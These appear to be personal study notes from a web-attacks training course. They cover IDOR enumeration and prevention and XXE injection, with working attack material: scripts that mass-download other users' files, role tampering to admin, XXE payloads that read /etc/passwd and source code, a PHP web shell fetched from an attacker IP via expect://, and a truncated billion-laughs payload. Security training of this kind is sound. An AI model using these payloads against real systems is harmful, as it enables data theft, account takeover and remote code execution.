# HTTP Verb Tampering

 Common verbs other than `GET` and `POST`:

# Insecure Direct Object References (IDOR)

- DOR vulnerabilities occur when a web application exposes a direct reference to an object, like a file or a database resource, which the end-user can directly control to obtain access to other similar objects. If any user can access any resource due to the lack of a solid access control system, the system is considered to be vulnerable.

- if users request access to a file they recently uploaded, they may get a link to it such as (`download.php?file_id=123`). So, as the link directly references the file with (`file_id=123`), what would happen if we tried to access another file (which may not belong to us) with (`download.php?file_id=124`)? If the web application does not have a proper access control system on the back-end, we may be able to access any file by sending a request with its `file_id`.
	- In many cases, we may find that the `id` is easily guessable, making it possible to retrieve many files or resources that we should not have access to based on our permissions.

>The main takeaway is that an IDOR vulnerability mainly exists due to the lack of an access control on the back-end. The only thing stopping users from accessing other user's data would be the front-end implementation of the application, which is designed to only show the user's data.

**IDOR Insecure Function Calls**
- Many web applications expose URL parameters or APIs for admin-only functions in the front-end code of the web application and disable these functions for non-admin users
	- . However, if we had access to such parameters or APIs, we may call them with our standard user privileges if the back-end did not explicitly deny non-admin users from calling these functions.

# Identifying IDORs

## URL Parameters & APIs

- Whenever we receive a specific file or resource, we should study the HTTP requests to look for URL parameters or APIs with an object reference (e.g. `?uid=1` or `?filename=file_1.pdf`). These are mostly found in URL parameters or APIs but may also be found in other HTTP headers, like cookies.
- In the most basic cases, we can try incrementing the values of the object references to retrieve other data, like (`?uid=2`) or (`?filename=file_2.pdf`). We can also use a fuzzing application.


## AJAX Calls

- Some web applications developed in JavaScript frameworks may insecurely place all function calls on the front-end and use the appropriate ones based on the user role.
- For example, if we did not have an admin account, only the user-level functions would be used, while the admin functions would be disabled. However, we may still be able to find the admin functions if we look into the front-end JavaScript code and may be able to identify AJAX calls to specific end-points or APIs that contain direct object references. If we identify direct object references in the JavaScript code, we can test them for IDOR vulnerabilities.
-  The following example shows a basic example of an AJAX call:
```javascript
function changeUserPassword() {
    $.ajax({
        url:"change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:function(result){
            //
        }
    });
}
```


## Understand Hashing/Encoding

- Some web applications may not use simple sequential numbers as object references but may encode the reference or hash it instead
- Suppose the reference was encoded with a common encoder (e.g. `base64`). In that case, we could decode it and view the plaintext of the object reference, change its value, and then encode it again to access other data.
- On the other hand, the object reference may be hashed, like (`download.php?filename=c81e728d9d4c2f636f067f89cc14862c`). At a first glance, we may think that this is a secure object reference, as it is not using any clear text or easy encoding. However, if we look at the source code, we may see what is being hashed before the API call is made:
```javascript
$.ajax({
    url:"download.php",
    type: "post",
    dataType: "json",
    data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
    success:function(result){
        //
    }
});
```
-  Otherwise, we may manually try to identify the hashing algorithm being used (e.g., with hash identifier tools) and then hash the filename to see if it matches the used hash.


## Compare User Roles

- If we want to perform more advanced IDOR attacks, we may need to register multiple users and compare their HTTP requests and object references. This may allow us to understand how the URL parameters and unique identifiers are being calculated and then calculate them for other users to gather their data.
- For example, if we had access to two different users, one of which can view their salary after making the following API call:
```json
{
  "attributes" : 
    {
      "type" : "salary",
      "url" : "/services/data/salaries/users/1"
    },
  "Id" : "1",
  "Name" : "User1"

}
```

- The second user may not have all of these API parameters to replicate the call and should not be able to make the same call as `User1`. However, with these details at hand, we can try repeating the same API call while logged in as `User2` to see if the web application returns anything.

# Mass IDOR Enumeration

- Once we identify a potential IDOR, we can start testing it with basic techniques to see whether it would expose any other data. As for advanced IDOR attacks, we need to better understand how the web application works, how it calculates its object references, and how its access control system works to be able to perform advanced attacks that may not be exploitable with basic techniques.

## Insecure Parameters

Let's start with a basic example that showcases a typical IDOR vulnerability. The exercise below is an `Employee Manager` web application that hosts employee records:
![[2023-05-31 21_23_42-Hack The Box - Academy.png]]

Our web application assumes that we are logged in as an employee with user id `uid=1` to simplify things. This would require us to log in with credentials in a real web application, but the rest of the attack would be the same. Once we click on `Documents`, we are redirected to

`/documents.php`:
![[2023-05-31 21_24_05-Hack The Box - Academy.png]]

When we get to the `Documents` page, we see several documents that belong to our user. These can be files uploaded by our user or files set for us by another department (e.g., HR Department). Checking the file links, we see that they have individual names:
```html
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf
```

We see that the files have a predictable naming pattern, as the file names appear to be using the user `uid` and the month/year as part of the file name, which may allow us to fuzz files for other users. This is the most basic type of IDOR vulnerability and is called `static file IDOR`. However, to successfully fuzz other files, we would assume that they all start with `Invoice` or `Report`, which may reveal some files but not all. So, let's look for a more solid IDOR vulnerability.

We see that the page is setting our `uid` with a `GET` parameter in the URL as (`documents.php?uid=1`). If the web application uses this `uid` GET parameter as a direct reference to the employee records it should show, we may be able to view other employees' documents by simply changing this value. If the back-end end of the web application `does` have a proper access control system, we will get some form of `Access Denied`. However, given that the web application passes as our `uid` in clear text as a direct reference, this may indicate poor web application design, leading to arbitrary access to employee records.

When we try changing the `uid` to `?uid=2`, we don't notice any difference in the page output, as we are still getting the same list of documents, and may assume that it still returns our own documents:
![[2023-05-31 21_30_57-Hack The Box - Academy.png]]

However, `we must be attentive to the page details during any web pentest` and always keep an eye on the source code and page size. If we look at the linked files, or if we click on them to view them, we will notice that these are indeed different files, which appear to be the documents belonging to the employee with `uid=2`:
```html
/documents/Invoice_2_08_2020.pdf
/documents/Report_2_12_2020.pdf
```


## Mass Enumeration

We can try manually accessing other employee documents with `uid=3`, `uid=4`, and so on. However, manually accessing files is not efficient in a real work environment with hundreds or thousands of employees. So, we can either use a tool like `Burp Intruder` or `ZAP Fuzzer` to retrieve all files or write a small bash script to download all files, which is what we will do.

We can click on [`CTRL+SHIFT+C`] in Firefox to enable the `element inspector`, and then click on any of the links to view their HTML source code, and we will get the following:
```html
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```

We can pick any unique word to be able to `grep` the link of the file. In our case, we see that each link starts with `<li class='pure-tree_link'>`, so we may `curl` the page and `grep` for this line, as follows:

```shell-session
wallywhatever@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=1" | grep "<li class='pure-tree_link'>"

<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```

As we can see, we were able to capture the document links successfully. We may now use specific bash commands to trim the extra parts and only get the document links in the output. However, it is a better practice to use a `Regex` pattern that matches strings between `/document` and `.pdf`, which we can use with `grep` to only get the document links, as follows:
```shell-session
wallywhatever@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"

/documents/Invoice_3_06_2020.pdf
/documents/Report_3_01_2020.pdf
```

Now, we can use a simple `for` loop to loop over the `uid` parameter and return the document of all employees, and then use `wget` to download each document link:
```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

# Bypassing Encoded References


Let's go back to the `Employee Manager` web application to test the `Contracts` functionality:
![[2023-06-01 17_29_15-Hack The Box - Academy.png]]

If we click on the `Employment_contract.pdf` file, it starts downloading the file. The intercepted request in Burp looks as follows:
![[Pasted image 20230601172943.jpg]]

We see that it is sending a `POST` request to `download.php` with the following data:
```php
contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
```

Using a `download.php` script to download files is a common practice to avoid directly linking to files.  In this case, the web application appears to be hashing it in an `md5` format.

We can attempt to hash various values, like `uid`, `username`, `filename`, and many others, and see if any of their `md5` hashes match the above value. If we find a match, then we can replicate it for other users and collect their files. For example, let's try to compare the `md5` hash of our `uid`, and see if it matches the above hash:
```shell-session
echo -n 1 | md5sum

c4ca4238a0b923820dcc509a6f75849b -
```

 In this case, the `md5` hash could be for a unique value or a combination of values, which would be very difficult to predict, making this direct reference a `Secure Direct Object Reference`. However, there's one fatal flaw in this web application.


## Function Disclosure

As most modern web applications are developed using JavaScript frameworks, like `Angular`, `React`, or `Vue.js`, many web developers may make the mistake of performing sensitive functions on the front-end, which would expose them to attackers.

For example, if the above hash was being calculated on the front-end, we can study the function and then replicate what it's doing to calculate the same hash. Luckily for us, this is precisely the case in this web application.

If we take a look at the link in the source code, we see that it is calling a JavaScript function with `javascript:downloadContract('1')`. Looking at the `downloadContract()` function in the source code, we see the following:
```javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```

This function appears to be sending a `POST` request with the `contract` parameter, which is what we saw above. The value it is sending is an `md5` hash using the `CryptoJS` library, which also matches the request we saw earlier. So, the only thing left to see is what value is being hashed.

In this case, the value being hashed is `btoa(uid)`, which is the `base64` encoded string of the `uid` variable, which is an input argument for the function. Going back to the earlier link where the function was called, we see it calling `downloadContract('1')`. So, the final value being used in the `POST` request is the `base64` encoded string of `1`, which was then `md5` hashed.

We can test this by `base64` encoding our `uid=1`, and then hashing it with `md5`, as follows:
```shell-session
echo -n 1 | base64 -w 0 | md5sum

cdd96d3cc73d1dbdaffa03cc6cd7339b -
```

As we can see, this hash matches the hash in our request, meaning that we have successfully reversed the hashing technique used on the object references, turning them into IDOR's. With that, we can begin enumerating other employees' contracts using the same hashing method we used above.


## Mass Enumeration

Let's write a simple bash script to retrieve all employee contracts. More often than not, this is the easiest and most efficient method of enumerating data and files through IDOR vulnerabilities. In more advanced cases, we may utilize tools like `Burp Intruder` or `ZAP Fuzzer`, but a simple bash script should be the best course for our exercise.

We can start by calculating the hash for each of the first ten employees using the same previous command while using `tr -d` to remove the trailing `-` characters, as follows:
``` bash
for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
```

Next, we can make a `POST` request on `download.php` with each of the above hashes as the `contract` value, which should give us our final script:
```bash
#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done
```

# IDOR in Insecure APIs

IDOR Insecure Function Calls enable us to call APIs or execute functions as another user. In many cases, we may be obtaining certain information through an information disclosure IDOR vulnerability and then using this information with IDOR insecure function call vulnerabilities.

## Identifying Insecure APIs

Going back to our `Employee Manager` web application, we can start testing the `Edit Profile` page for IDOR vulnerabilities:
![[2023-06-01 21_14_06-Hack The Box - Academy.png]]

When we click on the `Edit Profile` button, we are taken to a page to edit information of our user profile, namely `Full Name`, `Email`, and `About Me`, which is a common feature in many web applications:
![[2023-06-01 21_15_06-Hack The Box - Academy.png]]

We can change any of the details in our profile and click `Update profile`, and we'll see that they get updated and persist through refreshes, which means they get updated in a database somewhere. Let's intercept the `Update` request in Burp and look at it:
![[Pasted image 20230601211531.jpg]]

We see that the page is sending a `PUT` request to the `/profile/api.php/profile/1` API endpoint. `PUT` requests are usually used in APIs to update item details, while `POST` is used to create new items, `DELETE` to delete items, and `GET` to retrieve item details. So, a `PUT` request for the `Update profile` function is expected. The interesting bit is the JSON parameters it is sending:
```json
{
    "uid": 1,
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "employee",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb",
    "about": "A Release is like a boat. 80% of the holes plugged is not good enough."
}
```

We see that the `PUT` request includes a few hidden parameters, like `uid`, `uuid`, and most interestingly `role`, which is set to `employee`. The web application also appears to be setting the user access privileges (e.g. `role`) on the client-side, in the form of our `Cookie: role=employee` cookie, which appears to reflect the `role` specified for our user. This is a common security issue. The access control privileges are sent as part of the client's HTTP request, either as a cookie or as part of the JSON request, leaving it under the client's control, which could be manipulated to gain more privileges.

So, unless the web application has a solid access control system on the back-end, `we should be able to set an arbitrary role for our user, which may grant us more privileges`. However, how would we know what other roles exist?

## Exploiting Insecure APIs

We know that we can change the `full_name`, `email`, and `about` parameters, as these are the ones under our control in the HTML form in the `/profile` web page. So, let's try to manipulate the other parameters.

There are a few things we could try in this case:

1. Change our `uid` to another user's `uid`, such that we can take over their accounts
2. Change another user's details, which may allow us to perform several web attacks
3. Create new users with arbitrary details, or delete existing users
4. Change our role to a more privileged role (e.g. `admin`) to be able to perform more actions

Let's start by changing our `uid` to another user's `uid` (e.g. `"uid": 2`). However, any number we set other than our own `uid` gets us a response of `uid mismatch`:
![[Pasted image 20230601211743.jpg]]

The web application appears to be comparing the request's `uid` to the API endpoint (`/1`). This means that a form of access control on the back-end prevents us from arbitrarily changing some JSON parameters, which might be necessary to prevent the web application from crashing or returning errors.

Perhaps we can try changing another user's details. We'll change the API endpoint to `/profile/api.php/profile/2`, and change `"uid": 2` to avoid the previous `uid mismatch`:
![[Pasted image 20230601211807.jpg]]

As we can see, this time, we get an error message saying `uuid mismatch`. The web application appears to be checking if the `uuid` value we are sending matches the user's `uuid`. Since we are sending our own `uuid`, our request is failing. This appears to be another form of access control to prevent users from changing another user's details.

Next, let's see if we can create a new user with a `POST` request to the API endpoint. We can change the request method to `POST`, change the `uid` to a new `uid`, and send the request to the API endpoint of the new `uid`:
![[Pasted image 20230601211839.jpg]]

We get an error message saying `Creating new employees is for admins only`. The same thing happens when we send a `Delete` request, as we get `Deleting employees is for admins only`. The web application might be checking our authorization through the `role=employee` cookie because this appears to be the only form of authorization in the HTTP request.

Finally, let's try to change our `role` to `admin`/`administrator` to gain higher privileges. Unfortunately, without knowing a valid `role` name, we get `Invalid role` in the HTTP response, and our `role` does not update:![[Pasted image 20230601211905.jpg]]

So, `all of our attempts appear to have failed`. We cannot create or delete users as we cannot change our `role`. We cannot change our own `uid`, as there are preventive measures on the back-end that we cannot control, nor can we change another user's details for the same reason. `So, is the web application secure against IDOR attacks?`.

So far, we have only been testing the `IDOR Insecure Function Calls`. However, we have not tested the API's `GET` request for `IDOR Information Disclosure Vulnerabilities`. If there was no robust access control system in place, we might be able to read other users' details, which may help us with the previous attacks we attempted.
___

# Chaining IDOR Vulnerabilities

Usually, a `GET` request to the API endpoint should return the details of the requested user, so we may try calling it to see if we can retrieve our user's details. We also notice that after the page loads, it fetches the user details with a `GET` request to the same API endpoint:![[Pasted image 20230601212057.jpg]]

As mentioned in the previous section, the only form of authorization in our HTTP requests is the `role=employee` cookie, as the HTTP request does not contain any other form of user-specific authorization, like a JWT token, for example. Even if a token did exist, unless it was being actively compared to the requested object details by a back-end access control system, we may still be able to retrieve other users' details.


## Information Disclosure

Let's send a `GET` request with another `uid`:
![[Pasted image 20230601212126.jpg]]

As we can see, this returned the details of another user, with their own `uuid` and `role`, confirming an `IDOR Information Disclosure vulnerability`. This provides us with new details, most notably the `uuid`, which we could not calculate before, and thus could not change other users' details.


## Modifying Other Users' Details

Now, with the user's `uuid` at hand, we can change this user's details by sending a `PUT` request to `/profile/api.php/profile/2` with the above details along with any modifications we made, as follows:
![[Pasted image 20230601212208.jpg]]

We don't get any access control error messages this time, and when we try to `GET` the user details again, we see that we did indeed update their details:
![[Pasted image 20230601212224.jpg]]

In addition to allowing us to view potentially sensitive details, the ability to modify another user's details also enables us to perform several other attacks. 

One type of attack is `modifying a user's email address` and then requesting a password reset link, which will be sent to the email address we specified, thus allowing us to take control over their account. 

Another potential attack is `placing an XSS payload in the 'about' field`, which would get executed once the user visits their `Edit profile` page, enabling us to attack the user in different ways.


## Chaining Two IDOR Vulnerabilities

Since we have identified an IDOR Information Disclosure vulnerability, we may also enumerate all users and look for other `roles`, ideally an admin role. `Try to write a script to enumerate all users, similarly to what we did previously`.

Once we enumerate all users, we will find an admin user with the following details:
```json
{
    "uid": "X",
    "uuid": "a36fa9e66e85f2dd6f5e13cad45248ae",
    "role": "web_admin",
    "full_name": "administrator",
    "email": "webadmin@employees.htb",
    "about": "HTB{FLAG}"
}
```

We may modify the admin's details and then perform one of the above attacks to take over their account. However, as we now know the admin role name (`web_admin`), we can set it to our user so we can create new users or delete current users. To do so, we will intercept the request when we click on the `Update profile` button and change our role to `web_admin`:
![[Pasted image 20230601212339.jpg]]

This time, we do not get the `Invalid role` error message, nor do we get any access control error messages, meaning that there are no back-end access control measures to what roles we can set for our user. If we `GET` our user details, we see that our `role` has indeed been set to `web_admin`. Now, we can refresh the page to update our cookie, or manually set it as `Cookie: role=web_admin`, and then intercept the `Update` request to create a new user and see if we'd be allowed to do so:
![[Pasted image 20230601212406.jpg]]

We did not get an error message this time. If we send a `GET` request for the new user, we see that it has been successfully created:

By combining the information we gained from the `IDOR Information Disclosure vulnerability` with an `IDOR Insecure Function Calls` attack on an API endpoint, we could modify other users' details and create/delete users while bypassing various access control checks in place.

With our new `role`, we may also perform mass assignments to change specific fields for all users, like placing XSS payloads in their profiles or changing their email to an email we specify.

# IDOR Prevention

## Object-Level Access Control

An Access Control system should be at the core of any web application since it can affect its entire design and structure. To properly control each area of the web application, its design has to support the segmentation of roles and permissions in a centralized manner. However, Access Control is a vast topic, so we will only focus on its role in IDOR vulnerabilities, represented in `Object-Level` access control mechanisms.

User roles and permissions are a vital part of any access control system, which is fully realized in a Role-Based Access Control (RBAC) system. To avoid exploiting IDOR vulnerabilities, we must map the RBAC to all objects and resources. The back-end server can allow or deny every request, depending on whether the requester's role has enough privileges to access the object or the resource.

Once an RBAC has been implemented, each user would be assigned a role that has certain privileges. Upon every request the user makes, their roles and privileges would be tested to see if they have access to the object they are requesting. They would only be allowed to access it if they have the right to do so.

There are many ways to implement an RBAC system and map it to the web application's objects and resources, and designing it in the core of the web application's structure is an art to perfect. The following is a sample code of how a web application may compare user roles to objects to allow or deny access control:
```javascript
match /api/profile/{userId} {
    allow read, write: if user.isAuth == true
    && (user.uid == userId || user.roles == 'admin');
}
```

The above example uses the `user` token, which can be `mapped from the HTTP request made to the RBAC` to retrieve the user's various roles and privileges. Then, it only allows read/write access if the user's `uid` in the RBAC system matches the `uid` in the API endpoint they are requesting. Furthermore, if a user has `admin` as their role in the back-end RBAC, they are allowed read/write access.

In our previous attacks, we saw examples of the user role being stored in the user's details or in their cookie, both of which are under the user's control and can be manipulated to escalate their access privileges. The above example demonstrates a safer approach to mapping user roles, as the user privileges `were not be passed through the HTTP request`, but mapped directly from the RBAC on the back-end using the user's logged-in session token as an authentication mechanism.

There's a lot more to access control systems and RBACs, as they can be some of the most challenging systems to design. This, however, should give us an idea of how we should control user access over web applications' objects and resources.

## Object Referencing

While the core issue with IDOR lies in broken access control (`Insecure`), having access to direct references to objects (`Direct Object Referencing`) makes it possible to enumerate and exploit these access control vulnerabilities. We may still use direct references, but only if we have a solid access control system implemented.

Even after building a solid access control system, we should never use object references in clear text or simple patterns (e.g. `uid=1`). We should always use strong and unique references, like salted hashes or `UUID`'s. For example, we can use `UUID V4` to generate a strongly randomized id for any element, which looks something like (`89c9b29b-d19f-4515-b2dd-abb6e693eb20`). Then, we can map this `UUID` to the object it is referencing in the back-end database, and whenever this `UUID` is called, the back-end database would know which object to return. The following example PHP code shows us how this may work:
```php
$uid = intval($_REQUEST['uid']);
$query = "SELECT url FROM documents where uid=" . $uid;
$result = mysqli_query($conn, $query);
$row = mysqli_fetch_array($result));
echo "<a href='" . $row['url'] . "' target='_blank'></a>";
```

Furthermore, as we have seen previously in the module, we should never calculate hashes on the front-end. We should generate them when an object is created and store them in the back-end database. Then, we should create database maps to enable quick cross-referencing of objects and references.

Finally, we must note that using `UUID`s may let IDOR vulnerabilities go undetected since it makes it more challenging to test for IDOR vulnerabilities. This is why strong object referencing is always the second step after implementing a strong access control system. Furthermore, some of the techniques we learned in this module would work even with unique references if the access control system is broken, like repeating one user's request with another user's session, as we have previously seen.

If we implement both of these security mechanisms, we should be relatively safe against IDOR vulnerabilities.

# Intro to XXE

`XML External Entity (XXE) Injection` vulnerabilities occur when XML data is taken from a user-controlled input without properly sanitizing or safely parsing it, which may allow us to use XML features to perform malicious actions.


## XML

`Extensible Markup Language (XML)` is a common markup language (similar to HTML and SGML) designed for flexible transfer and storage of data and documents in various types of applications. XML is not focused on displaying data but mostly on storing documents' data and representing data structures. XML documents are formed of element trees, where each element is essentially denoted by a `tag`, and the first element is called the `root element`, while other elements are `child elements`.

Here we see a basic example of an XML document representing an e-mail document structure:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<email>
  <date>01-01-2022</date>
  <time>10:00 am UTC</time>
  <sender>john@inlanefreight.com</sender>
  <recipients>
    <to>HR@inlanefreight.com</to>
    <cc>
        <to>billing@inlanefreight.com</to>
        <to>payslips@inlanefreight.com</to>
    </cc>
  </recipients>
  <body>
  Hello,
      Kindly share with me the invoice for the payment made on January 1, 2022.
  Regards,
  John
  </body> 
</email>
```

The above example shows some of the key elements of an XML document, like:
![[2023-06-02 10_46_55-Web Attacks.png]]

Furthermore, some characters are used as part of an XML document structure, like `<`, `>`, `&`, or `"`. So, if we need to use them in an XML document, we should replace them with their corresponding entity references (e.g. `&lt;`, `&gt;`, `&amp;`, `&quot;`). Finally, we can write comments in XML documents between `<!--` and `-->`, similar to HTML documents.


## XML DTD

`XML Document Type Definition (DTD)` allows the validation of an XML document against a pre-defined document structure. The pre-defined document structure can be defined in the document itself or in an external file. The following is an example DTD for the XML document we saw earlier:
```xml
<!DOCTYPE email [
  <!ELEMENT email (date, time, sender, recipients, body)>
  <!ELEMENT recipients (to, cc?)>
  <!ELEMENT cc (to*)>
  <!ELEMENT date (#PCDATA)>
  <!ELEMENT time (#PCDATA)>
  <!ELEMENT sender (#PCDATA)>
  <!ELEMENT to  (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
]>
```

As we can see, the DTD is declaring the root `email` element with the `ELEMENT` type declaration and then denoting its child elements. After that, each of the child elements is also declared, where some of them also have child elements, while others may only contain raw data (as denoted by `PCDATA`).

The above DTD can be placed within the XML document itself, right after the `XML Declaration` in the first line. Otherwise, it can be stored in an external file (e.g. `email.dtd`), and then referenced within the XML document with the `SYSTEM` keyword, as follows:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "email.dtd">
```

It is also possible to reference a DTD through a URL.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "http://inlanefreight.com/email.dtd">
```


## XML Entities

We may also define custom entities (i.e. XML variables) in XML DTDs, to allow refactoring of variables and reduce repetitive data. This can be done with the use of the `ENTITY` keyword, which is followed by the entity name and its value, as follows:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

Once we define an entity, it can be referenced in an XML document between an ampersand `&` and a semi-colon `;` (e.g. `&company;`). Whenever an entity is referenced, it will be replaced with its value by the XML parser. 

**Most interestingly, however, we can `reference External XML Entities` with the `SYSTEM` keyword, which is followed by the external entity's path, as follows:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "http://localhost/company.txt">
  <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
]>
```

>**Note:** We may also use the `PUBLIC` keyword instead of `SYSTEM` for loading external resources, which is used with publicly declared entities and standards, such as a language code (`lang="en"`). In this module, we'll be using `SYSTEM`, but we should be able to use either in most cases.

This works similarly to internal XML entities defined within documents. When we reference an external entity (e.g. `&signature;`), the parser will replace the entity with its value stored in the external file (e.g. `signature.txt`). `When the XML file is parsed on the server-side, in cases like SOAP (XML) APIs or web forms, then an entity can reference a file stored on the back-end server, which may eventually be disclosed to us when we reference the entity`.


# Local File Disclosure

When a web application trusts unfiltered XML data from user input, we may be able to reference an external XML DTD document and define new custom XML entities. Suppose we can define new entities and have them displayed on the web page. In that case, we should also be able to define external entities and make them reference a local file, which, when displayed, should show us the content of that file on the back-end server.

## Identifying

The first step in identifying potential XXE vulnerabilities is finding web pages that accept an XML user input. We can start the exercise at the end of this section, which has a `Contact Form`:
![[Pasted image 20230602122812.jpg]]

If we fill the contact form and click on `Send Data`, then intercept the HTTP request with Burp, we get the following request:
![[Pasted image 20230602122824.jpg]]

As we can see, the form appears to be sending our data in an XML format to the web server, making this a potential XXE testing target. Suppose the web application uses outdated XML libraries, and it does not apply any filters or sanitization on our XML input. In that case, we may be able to exploit this XML form to read local files.

If we send the form without any modification, we get the following message:
![[Pasted image 20230602122839.jpg]]

We see that the value of the `email` element is being displayed back to us on the page. To print the content of an external file to the page, we should `note which elements are being displayed, such that we know which elements to inject into`.

For now, we know that whatever value we place in the `<email></email>` element gets displayed in the HTTP response. So, let us try to define a new entity and then use it as a variable in the `email` element to see whether it gets replaced with the value we defined. To do so, we can use what we learned in the previous section for defining new XML entities and add the following lines after the first line in the XML input:
```xml
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

>**Note:** In our example, the XML input in the HTTP request had no DTD being declared within the XML data itself, or being referenced externally, so we added a new DTD before defining our entity. If the `DOCTYPE` was already declared in the XML request, we would just add the `ENTITY` element to it.

Now, we should have a new XML entity called `company`, which we can reference with `&company;`. So, instead of using our email in the `email` element, let us try using `&company;`, and see whether it will be replaced with the value we defined (`Inlane Freight`):
![[Pasted image 20230602123011.jpg]]

As we can see, the response did use the value of the entity we defined (`Inlane Freight`) instead of displaying `&company;`, indicating that we may inject XML code. In contrast, a non-vulnerable web application would display (`&company;`) as a raw value. `This confirms that we are dealing with a web application vulnerable to XXE`.

>**Note:** Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the `Content-Type` header to `application/xml`, and then convert the JSON data to XML with an [online tool](https://www.convertjson.com/json-to-xml.htm). If the web application does accept the request with XML data, then we may also test it against XXE vulnerabilities, which may reveal an unanticipated XXE vulnerability.


## Reading Sensitive Files

Now that we can define new internal XML entities let's see if we can define external XML entities. Doing so is fairly similar to what we did earlier, but we'll just add the `SYSTEM` keyword and define the external reference path after it, as we have learned in the previous section:
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

Let us now send the modified request and see whether the value of our external XML entity gets set to the file we reference:
![[Pasted image 20230602123257.jpg]]

We see that we did indeed get the content of the `/etc/passwd` file, `meaning that we have successfully exploited the XXE vulnerability to read local files`. This enables us to read the content of sensitive files, like configuration files that may contain passwords or other sensitive files like an `id_rsa` SSH key of a specific user, which may grant us access to the back-end server. We can refer to the [[17. File Inclusion|File Inclusion]] module to see what attacks can be carried out through local file disclosure.


## Reading Source Code

Another benefit of local file disclosure is the ability to obtain the source code of the web application. This would allow us to perform a `Whitebox Penetration Test` to unveil more vulnerabilities in the web application, or at the very least reveal secret configurations like database passwords or API keys.

So, let us see if we can use the same attack to read the source code of the `index.php` file, as follows:
![[Pasted image 20230602123536.jpg]]

As we can see, this did not work, as we did not get any content. This happened because `the file we are referencing is not in a proper XML format, so it fails to be referenced as an external XML entity`. If a file contains some of XML's special characters (e.g. `<`/`>`/`&`), it would break the external entity reference and not be used for the reference. Furthermore, we cannot read any binary data, as it would also not conform to the XML format.

Luckily, PHP provides wrapper filters that allow us to base64 encode certain resources 'including files', in which case the final base64 output should not break the XML format. To do so, instead of using `file://` as our reference, we will use PHP's `php://filter/` wrapper. With this filter, we can specify the `convert.base64-encode` encoder as our filter, and then add an input resource (e.g. `resource=index.php`), as follows:
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

With that, we can send our request, and we will get the base64 encoded string of the `index.php` file.![[Pasted image 20230602123639.jpg]]

We can select the base64 string, click on Burp's Inspector tab (on the right pane), and it will show us the decoded file. For more on PHP filters, you can refer to the [[17. File Inclusion|File Inclusion]] module.

> This trick only works with PHP applications.


## Remote Code Execution with XXE

In addition to reading local files, we may be able to gain code execution over the remote server. The easiest method would be to look for `ssh` keys, or attempt to utilize a hash stealing trick in Windows-based web applications, by making a call to our server. 

If these do not work, we may still be able to execute commands on PHP-based web applications through the `PHP://expect` filter, though this requires the PHP `expect` module to be installed and enabled.

If the XXE directly prints its output 'as shown in this section', then we can execute basic commands as `expect://id`, and the page should print the command output. However, if we did not have access to the output, or needed to execute a more complicated command 'e.g. reverse shell', then the XML syntax may break and the command may not execute.

The most efficient method to turn XXE into RCE is by fetching a web shell from our server and writing it to the web app, and then we can interact with it to execute commands. To do so, we can start by writing a basic PHP web shell and starting a python web server, as follows:
``` bash
> echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
> sudo python3 -m http.server 80
```

Now, we can use the following XML code to execute a `curl` command that downloads our web shell into the remote server:
```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

>**Note:** We replaced all spaces in the above XML code with `$IFS`, to avoid breaking the XML syntax. Furthermore, many other characters like `|`, `>`, and `{` may break the code, so we should avoid using them.

Once we send the request, we should receive a request on our machine for the `shell.php` file, after which we can interact with the web shell on the remote server for code execution.

>**Note:** The expect module is not enabled/installed by default on modern PHP servers, so this attack may not always work. This is why XXE is usually used to disclose sensitive local files and source code, which may reveal additional vulnerabilities or ways to gain code execution.


## Other XXE Attacks

Another common attack often carried out through XXE vulnerabilities is SSRF exploitation, which is used to enumerate locally open ports and access their pages, among other restricted web pages, through the XXE vulnerability.

Finally, one common use of XXE attacks is causing a Denial of Service (DOS) to the hosting web server, with the use the following payload:

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
